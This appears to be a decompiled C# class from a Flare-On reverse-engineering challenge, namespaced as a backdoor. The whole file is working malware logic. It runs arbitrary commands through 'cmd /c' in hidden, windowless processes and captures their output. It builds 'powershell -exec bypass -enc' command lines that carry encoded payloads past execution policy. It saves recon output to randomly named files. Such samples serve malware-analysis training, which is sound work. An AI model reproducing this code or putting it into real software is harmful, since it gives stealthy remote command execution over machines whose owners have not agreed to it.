using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace FlareOn.Backdoor
{
	// Token: 0x02000003 RID: 3
	public class FLARE02
	{
		// Token: 0x06000006 RID: 6 RVA: 0x0000236C File Offset: 0x0000936C
		public static string flared_02(string c)
		{
			return FLARE02.flare_05("cmd", "/c " + c + " && exit");
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002398 File Offset: 0x00009398
		public static string flare_03(string c)
		{
			string result;
			try
			{
				result = FLARE02.flared_02(c);
			}
			catch (InvalidProgramException e)
			{
				result = (string)FLARE15.flare_70(e, new object[]
				{
					c
				});
			}
			return result;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000023DC File Offset: 0x000093DC
		public static string flared_03(string c)
		{
			return "powershell -exec bypass -enc \"" + c + "\"";
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002400 File Offset: 0x00009400
		public static string flare_04(string c)
		{
			string result;
			try
			{
				result = FLARE02.flared_03(c);
			}
			catch (InvalidProgramException e)
			{
				result = (string)FLARE15.flare_70(e, new object[]
				{
					c
				});
			}
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002444 File Offset: 0x00009444
		public static string flared_04(string f, string a)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(f, a);
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
			return process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000024B8 File Offset: 0x000094B8
		public static string flare_05(string f, string a)
		{
			string result;
			try
			{
				result = FLARE02.flared_04(f, a);
			}
			catch (InvalidProgramException e)
			{
				result = (string)FLARE15.flare_70(e, new object[]
				{
					f,
					a
				});
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002500 File Offset: 0x00009500
		public static string flared_05(string r)
		{
			string text = r;
			try
			{
				string text2 = string.Empty;
				string[] array = r.Split(new string[]
				{
					Environment.NewLine
				}, StringSplitOptions.RemoveEmptyEntries);
				for (int i = 0; i < array.Length; i++)
				{
					string text3 = array[i].Trim().Replace("\t\t", "\t").Replace("\t\t", "\t").Replace("\t\t", "\t").Replace("\t\t", "\t").Replace("  ", " ").Replace("  ", " ").Replace("  ", " ").Replace("  ", " ");
					bool flag = !string.IsNullOrEmpty(text3);
					if (flag)
					{
						bool flag2 = !string.IsNullOrEmpty(text2);
						if (flag2)
						{
							text2 += "\n";
						}
						text2 += text3;
					}
				}
				text = text2;
			}
			catch
			{
			}
			File.WriteAllText("flare.agent.recon." + new string((from s in Enumerable.Repeat<string>(FLARE03.chars_counter, 5)
			select s[FLARE10.r.Next(s.Length)]).ToArray<char>()), text);
			return text.Substring(0, 12);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002678 File Offset: 0x00009678
		public static string flare_06(string r)
		{
			string result;
			try
			{
				try
				{
					result = FLARE02.flared_05(r);
				}
				catch (InvalidProgramException e)
				{
					result = (string)FLARE15.flare_70(e, new object[]
					{
						r
					});
				}
			}
			catch
			{
				result = r;
			}
			return result;
		}
	}
}
